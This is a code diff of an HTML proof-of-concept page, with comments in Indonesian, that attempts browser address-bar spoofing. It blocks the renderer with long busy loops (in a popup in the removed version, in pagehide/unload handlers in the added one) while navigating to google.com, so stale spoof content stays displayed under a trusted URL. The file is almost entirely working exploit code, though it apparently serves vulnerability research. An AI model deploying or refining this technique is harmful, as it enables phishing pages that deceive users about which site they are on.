@@ -17,49 +17,26 @@
   <button id="startBtn">CLICK HERE</button>
 
   <script>
+    function blockRenderer(ms) {
+      const start = performance.now();
+      while (performance.now() - start < ms) {
+        // workload ringan biar loop nggak di-eliminasi optimizer
+        Math.sqrt(performance.now());
+      }
+    }
+
     document.getElementById("startBtn").onclick = function () {
-      this.remove();
+      // Blok renderer tepat saat commit navigasi:
+      window.addEventListener("pagehide", function () {
+        blockRenderer(15000);
+      }, { once: false });
+      window.addEventListener("unload", function () {
+        blockRenderer(15000);
+      }, { once: false });
 
-      // 1) user-gesture popup — popup blocker aman karena masih dalam gesture
-      const w = window.open("about:blank", "_blank");
-      if (!w) { alert("popup diblokir"); return; }
-
-      // 2) isi konten attacker di tab baru
-      w.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head><title>tester</title></head>
-        <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
-          <div>
-            <h1 style="font-size:64px;font-weight:bold;color:red;margin:0 0 30px 0">THIS IS NOT GOOGLE</h1>
-            <p style="font-size:40px;font-weight:bold;color:#007aff;margin:20px 0">STALE RENDER + OMNIBOX DESYNC PoC</p>
-          </div>
-        </body>
-        </html>
-      `);
-      w.document.close();
-
-      // 3) flush renderer pakai workload sinkron berat (jangan pakai prompt/alert
-      //    — di Android background-tab dialog sering di-suppress)
-      setTimeout(function () {
-        w.document.title = "busy";
-        const blob = new Blob(
-          [new ArrayBuffer(48 * 1024 * 1024)], // 48 MB — sesuaikan 24–96 MB
-          { type: "application/octet-stream" }
-        );
-        const img = new Image();
-        const ctx = new OffscreenCanvas(4096, 4096).getContext("2d");
-        const start = performance.now();
-        while (performance.now() - start < 20000) { // blok ~20 detik
-          ctx.fillRect(0, 0, 4096, 4096);
-          ctx.clearRect(0, 0, 4096, 4096);
-        }
-      }, 50);
-
-      // 4) commit navigasi ke target — omnibox pindah, renderer lama masih hang
-      setTimeout(function () {
-        w.location.href = "https://www.google.com";
-      }, 300);
+      // Konten spoof perlu sempat terpaint dulu — sudah terpaint karena
+      // halaman ini sudah terbuka. Langsung navigasi:
+      location.href = "https://www.google.com";
     };
   </script>
 </body>
